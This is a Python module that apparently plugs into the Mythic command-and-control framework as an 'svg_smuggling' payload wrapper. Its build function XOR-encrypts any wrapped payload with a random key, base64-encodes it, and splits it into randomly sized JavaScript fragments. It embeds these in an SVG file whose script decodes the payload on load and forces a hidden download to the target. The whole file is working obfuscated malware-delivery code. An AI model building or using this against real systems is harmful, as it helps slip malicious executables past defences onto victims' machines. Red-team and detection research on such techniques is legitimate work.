import logging
import pathlib
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random


class SVGSmuggling(PayloadType):
    name = "svg_smuggling"
    file_extension = "svg"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows, SupportedOS.MacOS, SupportedOS.Linux]
    wrapper = True
    wrapped_payloads = ["*"]
    note = """This payload wrapps any payload"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "smuggle"
    agent_icon_path = agent_path / "agent_functions" / "smuggle.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name="filename",
            required=True,
            parameter_type=BuildParameterType.String,
            description="Filename of the file which will be downloaded by the target",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            xor_key = random.randint(0x01, 0xff)

            bin_payload = self.wrapped_payload
            xored = bytes([b ^ xor_key for b in bin_payload])

            b64string = base64.b64encode(xored).decode()

            payload = """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" width="100" height="100">
    <script type="application/ecmascript"><![CDATA[
        document.addEventListener("DOMContentLoaded", function() {{
            function base64ToArrayBuffer(base64) {{
                const binary_string = atob(base64);

                const bytes = new Uint8Array( binary_string.length );
                for (var i = 0; i < binary_string.length; i++) {{ 
                    bytes[i] =  {xor_key} ^ binary_string.charCodeAt(i); 
                }}
                return bytes;
            }}

            {payload}
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {{type: 'octet/stream'}});
            var fileName = '{file_name}';
            var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
            a.setAttribute('style', 'display: none');
            a.href = URL.createObjectURL(blob);
            a.download = fileName;
            a.click();

        }});
    ]]></script>
</svg>
"""
            payload_args = {
                "file_name": self.get_parameter("filename"),
                "xor_key": hex(xor_key),
            }

            first = True
            js_payload = ""
            while(len(b64string) > 0):
                N = random.randint(10, 30)                

                part = b64string[:N]
                b64string = b64string[N:]

                if first:
                    js_payload += "var %s = '%s';\n" % ('file', part)
                else:
                    js_payload += "%s += '%s';\n" % ('file', part)

                first = False

            payload_args["payload"] = js_payload

            resp.payload = payload.format(**payload_args)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
